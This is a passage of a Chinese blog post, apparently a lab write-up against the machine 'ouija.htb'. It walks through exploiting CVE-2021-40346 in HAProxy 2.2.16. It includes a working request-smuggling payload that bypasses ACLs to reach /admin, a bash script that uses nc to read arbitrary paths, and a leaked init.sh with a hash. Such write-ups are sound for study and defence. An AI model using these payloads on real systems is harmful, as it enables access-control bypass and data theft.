@@ -1,0 +1,844 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="liuty">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="打开站点发现是用gitea搭建的，而且左上角探索点进去直接发现了user，以及整个网站的架构   进入该user项目当中，在最底部发现了HA-Proxy,并且版本是2.2.16  心中闪过一个念头，CVE-2021-40346？？？于是尝试进行HAProxy请求走私；该漏洞是一个整数溢出漏洞，可以进行HTTP请求走私攻击，这种攻击允许攻击者将HTTP请求“走私”到后端服务器，而代理服务器不知道这一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从HAProxy请求走私到hash长度拓展攻击">
+<meta property="og:url" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="liuty&#39;s blog">
+<meta property="og:description" content="打开站点发现是用gitea搭建的，而且左上角探索点进去直接发现了user，以及整个网站的架构   进入该user项目当中，在最底部发现了HA-Proxy,并且版本是2.2.16  心中闪过一个念头，CVE-2021-40346？？？于是尝试进行HAProxy请求走私；该漏洞是一个整数溢出漏洞，可以进行HTTP请求走私攻击，这种攻击允许攻击者将HTTP请求“走私”到后端服务器，而代理服务器不知道这一">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-44.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-45.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-45_1.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-08_09-27.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-23.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-15.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-19.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-22.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-26.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-32_1.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-37.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-57.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-44.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-59.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_12-00.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-57_1.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_13-48.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-29.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-32.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-33.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-35.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-38.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-08_11-03.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-42.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-43.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-45.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_15-26.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_17-57.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_18-05.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_19-10.png">
+<meta property="article:published_time" content="2024-03-08T00:44:22.000Z">
+<meta property="article:modified_time" content="2024-03-08T03:12:23.863Z">
+<meta property="article:author" content="liuty">
+<meta property="article:tag" content="外网打点">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-44.png">
+  
+  
+  
+  <title>从HAProxy请求走私到hash长度拓展攻击 - liuty&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"hCaWnJI7fVuWUvqb3FgzqfKD-gzGzoHsz","app_key":"NJZ1v4tGwTre1rcW3Qdw1WYU","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>liuty&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="从HAProxy请求走私到hash长度拓展攻击"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-08 08:44" pubdate>
+          2024年3月8日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">从HAProxy请求走私到hash长度拓展攻击</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>打开站点发现是用gitea搭建的，而且左上角探索点进去直接发现了user，以及整个网站的架构</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-44.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_10-44.png">
+<h6 id=""><a href="#" class="headerlink" title=""></a></h6><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-45.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_10-45.png">
+<h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>进入该user项目当中，在最底部发现了HA-Proxy,并且版本是2.2.16</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-45_1.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_10-45_1.png">
+<h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>心中闪过一个念头，CVE-2021-40346？？？于是尝试进行HAProxy请求走私；该漏洞是一个整数溢出漏洞，可以进行HTTP请求走私攻击，这种攻击允许攻击者将HTTP请求“走私”到后端服务器，而代理服务器不知道这一点，走私的请求会产生各种影响，比如：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">绕过安全控制，包括 HAProxy 中定义的任何 ACL<br>未经授权访问敏感数据<br>执行未经授权的命令或修改数据<br>劫持用户会话<br>无需用户交互即可利用反射型 XSS 漏洞<br></code></pre></td></tr></table></figure>
+<p>HTTP请求走私它基于干扰前端服务器（即HAProxy）和后端服务器之间的HTTP请求处理。攻击者通常通过发送特制的请求来利用此技术，该请求的正文中包含附加请求，成功攻击后，内部请求会通过前端走私（前端将其视为仅请求的正文），但会被后端作为正常请求使用<br>常利用的攻击场景——绕过 http 请求 ACL：触发HTTP请求走私攻击以绕过HAProxy定义的ACL规则</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-08_09-27.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-08_09-27.png">
+<h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>payload:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /guest HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: xx.xxxxx.xx:<span class="hljs-number">10001</span><br><span class="hljs-attribute">Content</span>-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">23</span><br><br><span class="hljs-attribute">GET</span> /admin HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">h</span>:GET /guest HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: xx.xxxxx.xx:<span class="hljs-number">10001</span><br></code></pre></td></tr></table></figure>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/">https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/</a></p>
+<p>接下来利用ha代理漏洞，通过尝试请求走私访问子域，fuzz一下子域</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-23.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_11-23.png">
+<h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>抓包，通过payload构造数据包，如果用burp的话，需要关掉burp的自动内容长度更新，然后自己根据实际请求手动指定Content-Length</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-15.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_11-15.png">
+<h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-19.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_11-19.png">
+<h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>根据payload,可以写一个bash脚本，通过整数溢出导致的请求走私来读取敏感信息</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs swift">#<span class="hljs-operator">!/</span>bin<span class="hljs-operator">/</span>bash<br><br>path<span class="hljs-operator">=</span><span class="hljs-variable">$1</span><br>cl<span class="hljs-operator">=</span>$((<span class="hljs-number">16</span><span class="hljs-operator">+</span>`echo <span class="hljs-variable">$path</span> <span class="hljs-operator">|</span> wc <span class="hljs-operator">-</span>m`))<br>caixukun<span class="hljs-operator">=</span><span class="hljs-string">&quot;POST / HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Host: ouija.htb<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Length: $cl<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>GET $path HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>h:GET / HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Host: ouija.htb<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span><br><br>echo <span class="hljs-operator">-</span>ne <span class="hljs-variable">$caixukun</span> <span class="hljs-operator">|</span> nc <span class="hljs-operator">-</span>w <span class="hljs-number">1</span> ouija.htb <span class="hljs-number">80</span> <span class="hljs-operator">|</span> sed <span class="hljs-operator">-</span>n &#x27;<span class="hljs-number">428</span>,<span class="hljs-variable">$p</span>&#x27;<br></code></pre></td></tr></table></figure>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-22.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_11-22.png">
+<h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>尝试访问子域，发现了两个敏感文件，一个js和一个bash脚本</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-26.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_11-26.png">
+<h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>尝试读取，发现可以读取成功<br>app.js</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-32_1.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_11-32_1.png">
+<h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>init.sh:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(date)</span> api config starts&quot;</span> &gt;&gt;<br><span class="hljs-built_in">mkdir</span> -p .config/bin .config/local .config/share /var/log/zapi<br><span class="hljs-built_in">export</span> k=$(<span class="hljs-built_in">cat</span> /opt/auth/api.key)<br><span class="hljs-built_in">export</span> botauth_id=<span class="hljs-string">&quot;bot1:bot&quot;</span><br><span class="hljs-built_in">export</span> <span class="hljs-built_in">hash</span>=<span class="hljs-string">&quot;4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1&quot;</span><br><span class="hljs-built_in">ln</span> -s /proc .config/bin/process_informations<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(date)</span> api config done&quot;</span> &gt;&gt; /var/log/zapi/api.log<br><br><span class="hljs-built_in">exit</span> 1<br></code></pre></td></tr></table></figure>
+<p>在前期信息收集阶段，发现了一个3000端口，访问了users路由，提示缺少ihash header，测试添加后提示缺少identification header，添加identification后也是token无效</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-37.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_10-37.png">
